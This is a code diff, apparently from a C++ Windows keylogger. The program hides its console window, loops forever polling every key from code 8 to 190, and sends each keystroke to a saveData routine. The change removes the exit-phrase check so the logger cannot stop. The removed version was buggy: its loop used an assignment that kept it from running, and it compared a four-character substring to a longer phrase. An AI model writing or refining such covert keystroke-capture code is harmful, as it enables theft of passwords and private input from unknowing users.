@@ -63,16 +63,13 @@ std::string translateSpecialKey(int key) {
 int main() {
     int specialKeyArray[] = {VK_SPACE, VK_BACK, VK_RETURN, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL};
     const int numSpecialKeys = sizeof(specialKeyArray) / sizeof(specialKeyArray[0]);
-	bool exitCondition = false;
-
+	
     // HIDES TERMINAL WINDOW
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
 
-	std::string inputBuffer;
-
     // LOOP FOREVER (Consider adding a way to exit the loop)
-    while (exitCondition = false) {
+    while (true) {
         // LOOP THROUGH EACH KEY
         for (int key = 8; key <= 190; key++) {
             // CHECK IF KEY IS PRESSED
@@ -84,18 +81,12 @@ int main() {
                     std::string specialKeyChar = translateSpecialKey(key);
                     saveData(specialKeyChar);
                 } else {
-                    char typedChar = (char)std::tolower(key);
-                    saveData(std::string(1, typedChar));
-                    inputBuffer += typedChar;
-
-                    // Check if "exit" is typed
-                    if (inputBuffer.size() >= 4 && inputBuffer.substr(inputBuffer.size() - 4) == "bayot si cocons") {
-                        exitCondition = true;
-                    }
+                    saveData(std::string(1, (char)std::tolower(key)));
                 }
             }
         }
     }
+    
 
     return 0;
 }
